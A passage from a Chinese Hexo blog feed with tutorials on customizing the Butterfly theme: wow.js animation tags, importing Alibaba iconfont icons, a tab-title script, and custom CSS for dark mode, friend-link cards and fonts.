class="string">1s</span> <span class="comment">#选填项，动画开始的延迟时间，单位可以是ms也可以是s。例如3s，700ms。</span></span><br><span class="line">      <span class="attr">offset:</span> <span class="number">100</span> <span class="comment">#选填项，开始动画的距离（相对浏览器底部）</span></span><br><span class="line">      <span class="attr">iteration:</span> <span class="number">2</span> <span class="comment">#选填项，动画重复的次数</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">class:</span> <span class="string">card-widget</span></span><br><span class="line">      <span class="attr">style:</span> <span class="string">animate__zoomIn</span></span><br></pre></td></tr></table></figure></li><li><p>参数释义</p></li></ol><div class="table-container"><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">备选值 / 类型</th><th style="text-align:left">释义</th></tr></thead><tbody><tr><td style="text-align:center">enable</td><td style="text-align:center">true/false</td><td style="text-align:left">【必选】控制开关</td></tr><tr><td style="text-align:center">priority</td><td style="text-align:center">number</td><td style="text-align:left">【可选】过滤器优先级，数值越小，执行越早，默认为 10，选填</td></tr><tr><td style="text-align:center">mobile</td><td style="text-align:center">true/false</td><td style="text-align:left">控制移动端是否启用，默认移动端禁用</td></tr><tr><td style="text-align:center">animateitem.class</td><td style="text-align:center">class</td><td style="text-align:left">【可选】添加动画类名，只支持给 class 添加</td></tr><tr><td style="text-align:center">animateitem.style</td><td style="text-align:center">text</td><td style="text-align:left">【可选】动画样式，具体类型参考 <a href="https://animate.style/">animate.css</a></td></tr><tr><td style="text-align:center">animateitem.duration</td><td style="text-align:center">time, 单位为 s 或 ms</td><td style="text-align:left">【可选】动画持续时间，单位可以是 ms 也可以是 s。例如 3s，700ms。</td></tr><tr><td style="text-align:center">animateitem.delay</td><td style="text-align:center">time, 单位为 s 或 ms</td><td style="text-align:left">【可选】动画开始的延迟时间，单位可以是 ms 也可以是 s。例如 3s，700ms。</td></tr><tr><td style="text-align:center">animateitem.offset</td><td style="text-align:center">number, 单位为 px</td><td style="text-align:left">【可选】开始动画的距离（相对浏览器底部）。</td></tr><tr><td style="text-align:center">animateitem.iteration</td><td style="text-align:center">number, 单位为 s 或 ms</td><td style="text-align:left">【可选】动画重复的次数</td></tr></tbody></table></div><h1 id="3-使用扩展（外挂标签用法）"><a href="#3-使用扩展（外挂标签用法）" class="headerlink" title="3.使用扩展（外挂标签用法）"></a>3.使用扩展（外挂标签用法）</h1><div class="tabs" id="test"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#test-1">标签语法</button></li><li class="tab"><button type="button" data-href="#test-2">参数配置</button></li><li class="tab active"><button type="button" data-href="#test-3">样式预览</button></li><li class="tab"><button type="button" data-href="#test-4">示列源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="test-1"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% wow [animete],[duration],[delay],[offset],[iteration] %&#125;</span><br><span class="line">内容</span><br><span class="line">&#123;% endwow %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test-2"><ol><li><code>animate</code>: 动画样式，效果详见 <a href="https://animate.style/">animate.css 参考文档</a></li><li><code>duration</code>: 选填项，动画持续时间，单位可以是 <code>ms</code> 也可以是 <code>s</code>。例如 <code>3s</code>，<code>700ms</code>。</li><li><code>delay</code>: 选填项，动画开始的延迟时间，单位可以是 <code>ms</code> 也可以是 <code>s</code>。例如 <code>3s</code>，<code>700ms</code>。</li><li><code>offset</code>: 选填项，开始动画的距离（相对浏览器底部）</li><li><code>iteration</code>: 选填项，动画重复的次数</li></ol><p><strong><code>注意，后面四个虽然是选填项，但是当有跨位选填时，次序不能乱。详见示例。支持嵌套其他外挂标签。</code></strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="test-3"><ol><li>flip动画效果。</li></ol><div class='wow animate__flip' data-wow-duration='' data-wow-delay='' data-wow-offset=''  data-wow-iteration='' ><div class="note green modern"><p><code>flip</code>动画效果。</p></div></div><ol><li>zoomIn动画效果，持续5s，延时5s，离底部100距离时启动，重复2次。</li></ol><div class='wow animate__zoomIn' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset='100'  data-wow-iteration='2' ><div class="note blue modern"><p><code>zoomIn</code>动画效果，持续<code>5s</code>，延时<code>5s</code>，离底部<code>100</code>距离时启动，重复<code>2</code>次</p></div></div><ol><li>slideInRight动画效果，持续5s，延时5s。</li></ol><div class='wow animate__slideInRight' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset=''  data-wow-iteration='' ><div class="note orange modern"><p><code>slideInRight</code>动画效果，持续<code>5s</code>，延时<code>5s</code>。</p></div></div><ol><li>heartBeat动画效果，延时5s，重复2次。此处注意不用的参数位置要留空，用逗号间隔。</li></ol><div class='wow animate__heartBeat' data-wow-duration='' data-wow-delay='5s' data-wow-offset=''  data-wow-iteration='2' ><div class="note red modern"><p><code>heartBeat</code>动画效果，延时<code>5s</code>，重复<code>2</code>次。</p></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test-4"><ol><li><p>flip动画效果。</p> <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__flip %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note green &#x27;fas fa-fan&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`flip`动画效果。</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>zoomIn动画效果，持续5s，延时5s，离底部100距离时启动，重复2次。</p> <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__zoomIn,5s,5s,100,2 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note blue &#x27;fas fa-bullhorn&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`zoomIn`动画效果，持续`5s`，延时`5s`，离底部`100`距离时启动，重复`2`次</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>slideInRight动画效果，持续5s，延时5s。</p> <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__slideInRight,5s,5s %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note orange &#x27;fas fa-car&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`slideInRight`动画效果，持续`5s`，延时`5s`。</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>heartBeat动画效果，延时5s，重复2次。此处注意不用的参数位置要留空，用逗号间隔。</p> <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__heartBeat,,5s,,2 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note red &#x27;fas fa-battery-half&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`heartBeat`动画效果，延时`5s`，重复`2`次。</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><hr><p class='p center code h4 red'>如有错误，欢迎评论区留言！</p>]]></content>
      
      
      <categories>
          
          <category> Butterfly </category>
          
          <category> 魔改日志文档 </category>
          
          <category> 魔改教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Butterfly </tag>
            
            <tag> 魔改日志文档 </tag>
            
            <tag> 魔改教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>引入阿里图标库</title>
      <link href="2021/10/20/%E5%BC%95%E5%85%A5%E9%98%BF%E9%87%8C%E5%9B%BE%E6%A0%87%E5%BA%93/"/>
      <url>2021/10/20/%E5%BC%95%E5%85%A5%E9%98%BF%E9%87%8C%E5%9B%BE%E6%A0%87%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<p class='p center logo large'>引入阿里图标库</p><p class='p center small'>Butterfly主题魔改教程，引入阿里图标库。</p><p><br/></p><div class="tip home"><p>我的博客主题版本为：hexo5.4、Butterfly3.6.2</p><p>如果与我的版本不一样可能会有略微差别，届时请自行百度。</p><p>本文参考文章：<a href="https://akilar.top/posts/d2ebecef/">Akilarの糖果屋的《Iconfont Inject》</a>。</p></div><h1 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h1><div class="tip info"><p>阿里图标库全名<a href="https://www.iconfont.cn/"><strong><code>阿里巴巴矢量图标库</code></strong></a>。提供了丰富的免费图标资源。并且支持多种引入方式。</p><p>本帖讨论的引入方案虽然是基于Butterfly主题进行的，但是仅仅是特化了引入写法（Butterfly的文件引入使用inject配置项),整体内容是完全可以兼容其他主题的。读者可以在熟读教程后自行修改引入方案。</p></div><h1 id="2-新建图标项目"><a href="#2-新建图标项目" class="headerlink" title="2.新建图标项目"></a>2.新建图标项目</h1><ol><li><p>访问<a href="https://www.iconfont.cn/"><strong><code>阿里巴巴矢量图标库</code></strong></a>,注册登录。</p></li><li><p>搜索自己心仪的图标，然后选择<strong><code>加到购物车</code></strong>。</p></li><li><p>选择完毕后点击右上角的购物车图标，打开侧栏，选择添加到项目，如果没有项目就新建一个。</p><p> <img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/npm/akilar-candyassets/image/81982c3a.png" alt="img"></p></li><li><p>可以通过页面上方的顶栏菜单：<strong><code>资源管理-&gt;我的项目</code></strong>，找到之前添加的图标项目。</p></li></ol><h1 id="3-引入图标"><a href="#3-引入图标" class="headerlink" title="3.引入图标"></a>3.引入图标</h1><div class="tip info"><p>本博客采用糖果屋教程中<strong><code>Font-class引用的线上引入方案</code></strong>引入图标，也可以参考<a href="https://www.iconfont.cn/help/detail?helptype=code">阿里巴巴矢量图标库使用文档</a>。</p></div><h2 id="3-1特点："><a href="#3-1特点：" class="headerlink" title="3.1特点："></a>3.1特点：</h2><ol><li>Font-class引用具有如下特点：<ul><li>兼容性良好，支持<code>ie8+</code>，及所有现代浏览器。</li><li>相比于<code>unicode</code>语意明确，书写更直观。可以很容易分辨这个icon是什么。</li><li>因为使用<code>class</code>来定义图标，所以当要替换图标时，只需要修改<code>class</code>里面的<code>unicode</code>引用。</li><li>不过因为本质上还是使用的字体，所以多色图标还是不支持的。</li></ul></li><li>线上引入方案的特点：<ul><li>这一方案偶尔会出现图标加载不出的情况。</li><li>但是便于随时对图标库进行升级，换一下在线链接即可，适合新手使用。</li></ul></li></ol><h2 id="3-2引入步骤："><a href="#3-2引入步骤：" class="headerlink" title="3.2引入步骤："></a>3.2引入步骤：</h2><ol><li><p>第一步：拷贝项目下面生成的<strong><code>fontclass代码</code></strong>：</p><ul><li><p>可以直接使用link标签在inject配置项中引入：<br>  打开<strong><code>[Blogroot]\_config.butterfly.yml</code></strong>,添加样式引用：</p>  <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;//at.alicdn.com/t/font_8d5l8fzk5b87iudi.css&quot;</span>  <span class="string">media=&quot;defer&quot;</span> <span class="string">onload=&quot;this.media=&#x27;all&#x27;&quot;&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>也可以使用@import在自定义样式中引入：<br>  打开<strong><code>custom.css</code></strong>,添加样式引入：</p>  <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@import</span> url(<span class="string">&quot;//at.alicdn.com/t/font_8d5l8fzk5b87iudi.css&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul></li><li><p>第二步：挑选相应图标并获取类名（可以通过自己的阿里图标库的font-class方案查询复制相应的<strong><code>icon-xxxx</code></strong>），应用于页面：</p> <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;iconfont icon-xxx&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>同时可以在自定义<strong><code>custom.css</code></strong>中添加如下样式来控制图标默认大小和颜色等属性，写法与字体样式类似，这恐怕也是它被称为<strong><code>iconfont</code></strong>（图标字体）的原因:</p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.iconfont</span> &#123;</span><br><span class="line"><span class="attribute">font-family</span>: <span class="string">&quot;iconfont&quot;</span> <span class="meta">!important</span>;</span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">3em</span>;</span><br><span class="line"><span class="comment">/* 可以定义图标大小 */</span></span><br><span class="line"><span class="attribute">font-style</span>: normal;</span><br><span class="line">-webkit-<span class="attribute">font</span>-smoothing: antialiased;</span><br><span class="line">-moz-osx-<span class="attribute">font</span>-smoothing: grayscale;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-rat</span>:before &#123;</span><br><span class="line">  color: <span class="number">#85c3de</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-ox</span>:before &#123;</span><br><span class="line">  color: <span class="number">#ffaf6e</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-tiger</span>:before &#123;</span><br><span class="line">  color: <span class="number">#f7c768</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-rabbit</span>:before &#123;</span><br><span class="line">  color: <span class="number">#ffbdd8</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-dragon</span>:before &#123;</span><br><span class="line">  color: <span class="number">#ff8787</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-snake</span>:before &#123;</span><br><span class="line">  color: <span class="number">#c3d686</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-horse</span>:before &#123;</span><br><span class="line">  color: <span class="number">#ffaf6e</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-goat</span>:before &#123;</span><br><span class="line">  color: <span class="number">#f7c768</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-monkey</span>:before &#123;</span><br><span class="line">  color: <span class="number">#c3d686</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-rooster</span>:before &#123;</span><br><span class="line">  color: <span class="number">#ff8787</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-dog</span>:before &#123;</span><br><span class="line">  color: <span class="number">#85c3de</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-boar</span>:before &#123;</span><br><span class="line">  color: <span class="number">#ffbdd8</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><hr><p class='p center code h4 red'>如有错误，欢迎评论区留言！</p>]]></content>
      
      
      <categories>
          
          <category> Butterfly </category>
          
          <category> 魔改日志文档 </category>
          
          <category> 魔改教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Butterfly </tag>
            
            <tag> 魔改日志文档 </tag>
            
            <tag> 魔改教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自定义样式魔改</title>
      <link href="2021/10/19/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A0%B7%E5%BC%8F%E9%AD%94%E6%94%B9/"/>
      <url>2021/10/19/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A0%B7%E5%BC%8F%E9%AD%94%E6%94%B9/</url>
      
        <content type="html"><![CDATA[<p class='p center logo large'>自定义样式魔改</p><p class='p center small'>Butterfly主题魔改教程，自定义样式魔改。</p><p><br/></p><div class="tip home"><p>我的博客主题版本为：hexo5.4、Butterfly3.6.2</p><p>如果与我的版本不一样可能会有略微差别，届时请自行百度。</p><p>本文参考文章：<a href="https://akilar.top/posts/ebf20e02/">Akilarの糖果屋的《Custom Beautify》</a>。</p></div><h1 id="1-自定义样式魔改引入"><a href="#1-自定义样式魔改引入" class="headerlink" title="1.自定义样式魔改引入"></a>1.自定义样式魔改引入</h1><p>引入魔改样式的方法很简单，自建一个 css 文件，然后引入即可。<br>以 <strong><code>butterfly</code></strong> 主题为例：可以在 <strong><code>[Blogroot]\themes\butterfly\source\css\</code></strong> 目录下新建 <strong><code>custom.css</code></strong> 文件，然后在 <strong><code>[Blogroot]\_config.butterfly.yml</code></strong> 的 <strong><code>inject</code></strong> 配置项中引入自定义样式文件。</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/custom.css&quot;</span>  <span class="string">media=&quot;defer&quot;</span> <span class="string">onload=&quot;this.media=&#x27;all&#x27;&quot;&gt;</span></span><br></pre></td></tr></table></figure><p>其中 <strong><code>media=&quot;defer&quot; onload=&quot;this.media=&#39;all&#39;&quot;</code> </strong>是异步加载配置项，确保自定义样式会在页面加载完成后才继续渲染。<strong><code>如果没有需求或效果不好可以不加这个</code></strong>。</p><h1 id="2-站点动态-title"><a href="#2-站点动态-title" class="headerlink" title="2.站点动态 title"></a>2.站点动态 title</h1><p><strong><code>站点动态 title</code></strong> 是通过 js 监测是否聚焦于当前页面，从而替换标签显示内容。</p><ol><li><p>在 <strong><code>[Blogroot]\themes\butterfly\source\js\</code></strong> 目录下新建 <strong><code>diytitle.js</code></strong>:</p> <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//动态标题</span></span><br><span class="line"><span class="keyword">var</span> OriginTitile = <span class="built_in">document</span>.title;</span><br><span class="line"><span class="keyword">var</span> titleTime;</span><br><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&#x27;visibilitychange&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">document</span>.hidden) &#123;</span><br><span class="line">        <span class="comment">//离开当前页面时标签显示内容</span></span><br><span class="line">        <span class="built_in">document</span>.title = <span class="string">&#x27;w(ﾟДﾟ)w 不要走！再看看嘛！&#x27;</span>;</span><br><span class="line">        <span class="built_in">clearTimeout</span>(titleTime);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//返回当前页面时标签显示内容</span></span><br><span class="line">        <span class="built_in">document</span>.title = <span class="string">&#x27;♪(^∇^*)欢迎回来！&#x27;</span> + OriginTitile;</span><br><span class="line">        <span class="comment">//两秒后变回正常标题</span></span><br><span class="line">        titleTime = <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">document</span>.title = OriginTitile;</span><br><span class="line">        &#125;, <span class="number">2000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>在 <strong><code>[Blogroot]\_config.butterfly.yml</code> </strong>的 <strong><code>inject</code></strong> 配置项添加引入，此处因为这是个独立的 js，而且体量极小，所以可以添加 <strong><code>async</code></strong> 异步加载标签：</p> <figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">  inject:</span><br><span class="line">    head:</span><br><span class="line">      # - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt;</span><br><span class="line">    bottom:</span><br><span class="line">      # - &lt;script src=&quot;xxxx&quot;&gt;&lt;/script&gt;</span><br><span class="line"><span class="addition">+     - &lt;script async src=&quot;/js/diytitle.js&quot;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="3-夜间模式或阅读模式修改"><a href="#3-夜间模式或阅读模式修改" class="headerlink" title="3.夜间模式或阅读模式修改"></a>3.夜间模式或阅读模式修改</h1><p><strong><code>Butterfly</code> </strong>主题使用 <strong><code>[data-theme=&#39;dark&#39;]</code> </strong>来界定夜间模式和日间模式。使用<strong><code>.read-mode</code></strong> 的类来界定阅读模式。<br>可以简单的认为，当切换为夜间模式或者阅读模式时，会给页面整体套上一个壳，而我们要做的就是对这个壳底下的元素重新定义样式。此处以对文字页和侧栏的设置为例：<br>修改 <strong><code>[Blogroot]\themes\butterfly\source\css\custom.css</code></strong>。</p><p>夜间模式：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-id">#aside-content</span> <span class="selector-class">.card-widget</span>&#123;</span><br><span class="line">      <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.5</span>)<span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-tag">div</span><span class="selector-id">#post</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.5</span>)<span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>阅读模式：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.read-mode</span> <span class="selector-id">#aside-content</span> <span class="selector-class">.card-widget</span>&#123;</span><br><span class="line">      <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">158</span>, <span class="number">204</span>, <span class="number">171</span>, <span class="number">0.5</span>)<span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="selector-class">.read-mode</span> <span class="selector-tag">div</span><span class="selector-id">#post</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">158</span>, <span class="number">204</span>, <span class="number">171</span>, <span class="number">0.5</span>)<span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>夜间模式下的阅读模式：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-class">.read-mode</span> <span class="selector-id">#aside-content</span> <span class="selector-class">.card-widget</span>&#123;</span><br><span class="line">        <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.5</span>)<span class="meta">!important</span>;</span><br><span class="line">        <span class="attribute">color</span>: <span class="number">#ffffff</span>;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span>  </span><br><span class="line">  <span class="selector-class">.read-mode</span> <span class="selector-tag">div</span><span class="selector-id">#post</span>&#123;</span><br><span class="line">      <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.5</span>)<span class="meta">!important</span>;</span><br><span class="line">      <span class="attribute">color</span>: <span class="number">#ffffff</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h1 id="4-友链卡片样式魔改"><a href="#4-友链卡片样式魔改" class="headerlink" title="4.友链卡片样式魔改"></a>4.友链卡片样式魔改</h1><p>修改<strong><code>[Blogroot]\themes\butterfly\source\css\custom.css</code></strong>，新增如下样式：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 设置白天模式的友链样式 */</span></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.flink-list-item</span>&#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#98d3d3</span>70;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">5px</span> <span class="number">5px</span> <span class="number">5px</span> <span class="number">#a0a0a0</span>;</span><br><span class="line">  <span class="comment">/*底色*/</span></span><br><span class="line">  <span class="attribute">background-color</span>:<span class="number">#000000</span>00;</span><br><span class="line">  <span class="comment">/*chrome2+,safari4+;multiplecolorstops*/</span></span><br><span class="line">  <span class="attribute">background-image</span>:<span class="built_in">-webkit-gradient</span>(linear,leftbottom,righttop,<span class="built_in">color-stop</span>(<span class="number">0.32</span>,<span class="number">#ce1ef1</span>70),<span class="built_in">color-stop</span>(<span class="number">0.66</span>,<span class="number">#0fe9e9</span>70),<span class="built_in">color-stop</span>(<span class="number">0.83</span>,<span class="number">#3e76aa</span>70));</span><br><span class="line">  <span class="comment">/*chrome10+,safari5.1+*/</span></span><br><span class="line">  <span class="attribute">background-image</span>:<span class="built_in">-webkit-linear-gradient</span>(<span class="number">45deg</span>,<span class="number">#ce1ef1</span>70,<span class="number">#0fe9e9</span>70,<span class="number">#3e76aa</span>70);</span><br><span class="line">  <span class="comment">/*firefox;multiplecolorstops*/</span></span><br><span class="line">  <span class="attribute">background-image</span>:<span class="built_in">-moz-linear-gradient</span>(<span class="number">45deg</span>,<span class="number">#ce1ef1</span>70,<span class="number">#0fe9e9</span>70,<span class="number">#3e76aa</span>70);</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 设置白天模式的友链遮罩层样式 */</span></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.flink-list-item</span><span class="selector-pseudo">::before</span>&#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.2</span>)<span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 设置鼠标悬停友链时的字体颜色 */</span></span><br><span class="line"><span class="selector-tag">span</span><span class="selector-class">.flink-item-name</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#e95f10</span>e1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 设置夜间模式的友链样式 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-tag">div</span><span class="selector-class">.flink-list-item</span>&#123;</span><br><span class="line">    <span class="comment">/* box-shadow: 5px 5px 5px #c0c0c0a4; */</span></span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="built_in">rgba</span>(<span class="number">102</span>, <span class="number">218</span>, <span class="number">215</span>, <span class="number">0.8</span>) <span class="number">2px</span> <span class="number">2px</span> <span class="number">8px</span> <span class="number">0px</span> <span class="meta">!important</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-tag">div</span><span class="selector-class">.flink-list-item</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="built_in">rgba</span>(<span class="number">102</span>, <span class="number">218</span>, <span class="number">215</span>, <span class="number">0.8</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">2px</span> <span class="number">0px</span> <span class="meta">!important</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">/* 设置夜间模式的友链遮罩层样式 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-tag">div</span><span class="selector-class">.flink-list-item</span><span class="selector-pseudo">::before</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.2</span>)<span class="meta">!important</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h1 id="5-修改博客字体样式"><a href="#5-修改博客字体样式" class="headerlink" title="5.修改博客字体样式"></a>5.修改博客字体样式</h1><p>修改<strong><code>[Blogroot]\themes\butterfly\source\css\custom.css</code></strong>，新增如下样式：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 更换博客字体样式 */</span></span><br><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">&#x27;tzy&#x27;</span>;</span><br><span class="line">    <span class="comment">/* 字体名自定义即可 */</span></span><br><span class="line">    <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">&#x27;https://cdn.jsdelivr.net/gh/tzy13755126023/BLOG_SOURCE/font/ZhuZiAWan.woff2&#x27;</span>);</span><br><span class="line">    <span class="comment">/* 字体文件路径 */</span></span><br><span class="line">    <span class="attribute">font-display</span>: swap;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">body</span>,</span><br><span class="line"><span class="selector-class">.gitcalendar</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>: tzy <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="6-修改朋友圈样式"><a href="#6-修改朋友圈样式" class="headerlink" title="6.修改朋友圈样式"></a>6.修改朋友圈样式</h1><p>前提是增加了朋友圈功能，修改<strong><code>[Blogroot]\themes\butterfly\source\css\custom.css</code></strong>，新增如下样式：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* 修改朋友圈白天样式 */</span></span><br><span class="line"><span class="selector-tag">div</span><span 